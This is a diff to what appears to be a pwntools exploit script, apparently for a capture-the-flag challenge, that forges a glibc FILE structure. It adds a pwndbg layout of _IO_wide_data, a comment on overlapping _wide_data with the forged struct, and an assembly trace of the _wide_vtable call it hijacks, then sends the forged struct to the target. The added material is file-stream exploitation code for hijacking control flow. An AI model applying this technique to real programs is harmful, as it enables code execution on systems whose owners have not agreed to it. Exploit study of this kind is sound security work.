@@ -81,11 +81,53 @@ type = struct _IO_FILE {
 
                                /* total size (bytes):  216 */
                              }
+""" 
+
+# _IO_wide_data struct
+"""
+pwndbg> ptype /ox (struct _IO_wide_data*)0
+type = struct _IO_wide_data {
+/* 0x0000      |  0x0008 */    wchar_t *_IO_read_ptr;
+/* 0x0008      |  0x0008 */    wchar_t *_IO_read_end;
+/* 0x0010      |  0x0008 */    wchar_t *_IO_read_base;
+/* 0x0018      |  0x0008 */    wchar_t *_IO_write_base;
+/* 0x0020      |  0x0008 */    wchar_t *_IO_write_ptr;
+/* 0x0028      |  0x0008 */    wchar_t *_IO_write_end;
+/* 0x0030      |  0x0008 */    wchar_t *_IO_buf_base;
+/* 0x0038      |  0x0008 */    wchar_t *_IO_buf_end;
+/* 0x0040      |  0x0008 */    wchar_t *_IO_save_base;
+/* 0x0048      |  0x0008 */    wchar_t *_IO_backup_base;
+/* 0x0050      |  0x0008 */    wchar_t *_IO_save_end;
+/* 0x0058      |  0x0008 */    __mbstate_t _IO_state;
+/* 0x0060      |  0x0008 */    __mbstate_t _IO_last_state;
+/* 0x0068      |  0x0070 */    struct _IO_codecvt {
+/* 0x0068      |  0x0038 */        _IO_iconv_t __cd_in;
+/* 0x00a0      |  0x0038 */        _IO_iconv_t __cd_out;
+
+                                   /* total size (bytes):  112 */
+                               } _codecvt;
+/* 0x00d8      |  0x0004 */    wchar_t _shortbuf[1];
+/* XXX  4-byte hole      */
+/* 0x00e0      |  0x0008 */    const struct _IO_jump_t *_wide_vtable;
+
+                               /* total size (bytes):  232 */
+                             } *
 """
 
 #we are pointing _wide_data to offset of 8 with our file struct so that _wide_data struct can be overlapped with our file struct. 
 
+#our flow 
+"""
+rdi = _IO_2_1_stdout struct pointer
 
+mov    rax, qword ptr [rdi + 0xa0]   // move rax = _IO_wide_data struct pointer
+   ...
+mov    rax, qword ptr [rax + 0xe0]   // move rax = _IO_wide_data->_wide_vtable
+
+call   qword ptr [rax + 0x68]      // calling  _IO_wide_data->_wide_vtable + 0x68
+
+"""
+fp.chain = 0xdeadc0de
 
 io.sendline(bytes(fp))
 
